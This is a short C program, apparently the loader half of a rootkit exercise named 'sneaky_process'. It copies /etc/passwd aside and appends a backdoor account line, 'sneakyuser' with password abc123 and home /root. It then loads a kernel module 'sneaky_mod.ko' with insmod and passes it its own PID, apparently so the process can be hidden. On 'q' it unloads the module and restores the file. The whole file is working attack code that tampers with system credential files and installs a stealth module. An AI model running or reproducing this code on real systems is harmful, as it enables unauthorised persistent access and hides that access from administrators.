#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/wait.h>



void addPID() {
    int pid = (int)getpid();
    char cmd[100];
    // build command string with PID value using sprintf() function
    sprintf(cmd, "insmod sneaky_mod.ko pid=%d", pid);
    system(cmd);
}

void readInput() {
    char c;
    while ((c = getchar()) != 'q') {
        // do nothing
    }
}

int main() {
    // // 1. prints the process ID 
    printf("sneaky_process pid = %d\n", getpid());

    // 2. copy /etc/passwd to /tmp/passwd
    char *cmd = "cp /etc/passwd /tmp/passwd";
    system(cmd);
    //add a new line to the end of the /etc/passwd file
    system("echo \"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\" >> /etc/passwd");

    // 3. load sneaky_mod.ko using 'insmod', pass PID to module
    addPID();

    // 4. enter loop: read a character each time, if 'q' then exit
    readInput();

    // 5. unload sneaky_mod.ko using 'rmmod'
    system("rmmod sneaky_mod.ko");

    // 6. restore /etc/passwd from /tmp/passwd
    system("mv /tmp/passwd /etc/passwd");
}